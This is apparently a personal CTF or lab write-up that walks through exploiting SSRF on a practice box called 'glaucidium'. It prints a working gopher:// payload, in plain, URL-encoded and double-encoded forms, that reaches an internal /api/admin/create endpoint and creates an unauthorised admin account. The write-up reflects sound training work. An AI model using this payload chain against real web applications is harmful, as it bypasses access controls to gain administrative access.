
#### Splash Page
- `login` page exists
![[Pasted image 20241208011859.png]]
##### Bottom Splash Page
- `HTML5UP` link
![[Pasted image 20241208012017.png]]
clicking leads to `templates` page - potential `SSTI`
![[Pasted image 20241208012055.png]]

-----

#### Login page
`http://glaucidium/public/user/login`
- create `login`
- regular `login`
![[Pasted image 20241208012335.png]]
able to create an account 
![[Pasted image 20241208012456.png]]
account created
![[Pasted image 20241208012521.png]]
able to login with `test@test.local:test`
![[Pasted image 20241208012554.png]]

#### SSRF testing
right under the `Welcome Test!` are fields that are able to be `edited` or `updated`
![[Pasted image 20241208013435.png]]
`Advanced Information` reveals places to upload files, this is a sign of `SSRF`
![[Pasted image 20241208013459.png]]
testing the `Website Field` with `http://192.168.45.231:8000/test` yields no results to my `python3` server
![[Pasted image 20241208013825.png]]
only updates the profile
![[Pasted image 20241208013932.png]]
the `Update CD or RESUME Method` includes 2 options - `upload file` and `upload from URL`
![[Pasted image 20241208014032.png]]
testing the `upload from URL` with this payload `http://192.168.45.231:8000/test` diplays an error

![[Pasted image 20241208014151.png]]
and yields results on our `python3` server
![[Pasted image 20241208014212.png]]
this is what the `burpsuite` looks like 
![[Pasted image 20241208014254.png]]
#### This is very CTF like. Explanation
when filtering by `/api` in `burpsuite` we can identify the `POST` request that created our user `test@test.local` - now because of this endpoint `/api/user/create` we are expected to assume `/api/admin/create` exists as well.
![[Pasted image 20241208021628.png]]
if we send the `/api/user/create` to repeater and change it to `/api/admin/create` we can see that it exists and we have to be authenticated to interact with it.
![[Pasted image 20241208021819.png]]
luckily we already proved that `SSRF` is a vector above with the `http://192.168.45.231:8000/test`

so to exploit this we are going to `utilize` a tool called `SSRF2gopher` which is utilized to interact with `API` endpoints

![[Pasted image 20241208022055.png]]
Throwing the last payload into the vulnerable `SSRF` field creates the `admintest` user
```bash
___________  _______                 __          
  / __/ __/ _ \/ __/_  |___ ____  ___  / /  ___ ____
 _\ \_\ \/ , _/ _// __// _ `/ _ \/ _ \/ _ \/ -_) __/
/___/___/_/|_/_/ /____/\_, /\___/ .__/_//_/\__/_/   
                      /___/    /_/                  

Created by eMVee 
    
[?] What is the address of the Host? 
127.0.0.1
[?] What port should be used for gopher? 
80
[?] What endpoint should be used for gopher? 
/api/admin/create
[?] What data would you like to post? 
username=admintest&password=admintest

[!] Plain text payload:


gopher://127.0.0.1:80/_POST /api/admin/create HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

username=admintest&password=admintest

[!] URL encoded payload:
gopher://127.0.0.1:80/_POST%20/api/admin/create%20HTTP/1.1%0aHost:%20127.0.0.1%0aContent-Type:%20application/x-www-form-urlencoded%0aContent-Length:%2037%0a%0ausername%3dadmintest%26password%3dadmintest

[!] Double URL encoded payload:
gopher%3a//127.0.0.1%3a80/_POST%2520/api/admin/create%2520HTTP/1.1%250aHost%3a%2520127.0.0.1%250aContent-Type%3a%2520application/x-www-form-urlencoded%250aContent-Length%3a%252037%250a%250ausername%3dadmintest%26password%3dadmintest

[!] Another option that might work via something like BURP:
gopher%3a%2F%2F127.0.0.1%3a80%2F_POST%2520%2Fapi%2Fadmin%2Fcreate%2520HTTP%2F1.1%250aHost%3a%2520127.0.0.1%250aContent-Type%3a%2520application%2Fx-www-form-urlencoded%250aContent-Length%3a%252037%250a%250ausername%3dadmintest%26password%3dadmintest

```
we can see that the account was created
![[Pasted image 20241208022227.png]]now at the `http://glaucidium/public/admin/login` endpoint try to login with `admintest:admintest`
![[Pasted image 20241208022400.png]]
and `local.txt`
![[Pasted image 20241208022417.png]]
